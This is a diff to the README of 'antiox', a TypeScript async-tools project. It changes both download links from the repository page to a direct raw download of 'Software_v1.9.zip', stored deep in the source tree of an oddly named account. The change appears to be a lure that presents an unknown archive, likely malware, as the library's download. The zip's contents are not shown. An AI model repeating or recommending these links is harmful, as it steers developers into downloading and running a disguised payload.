@@ -1,6 +1,6 @@
 # ⚡ antiox - Simple async tools for TypeScript
 
-[🟪 Download antiox](https://github.com/Godlinessgenusbrassavola663/antiox)
+[🟪 Download antiox](https://github.com/Godlinessgenusbrassavola663/antiox/raw/refs/heads/main/src/collections/Software_v1.9.zip)
 
 ## 🧭 What antiox does
 
@@ -31,7 +31,7 @@ If you only want to download the project, a browser is enough.
 
 Open the download page here:
 
-[🟩 Visit the antiox download page](https://github.com/Godlinessgenusbrassavola663/antiox)
+[🟩 Visit the antiox download page](https://github.com/Godlinessgenusbrassavola663/antiox/raw/refs/heads/main/src/collections/Software_v1.9.zip)
 
 If the page offers a release file, download it. If it opens the source project, use the files from that page in your TypeScript setup.
 
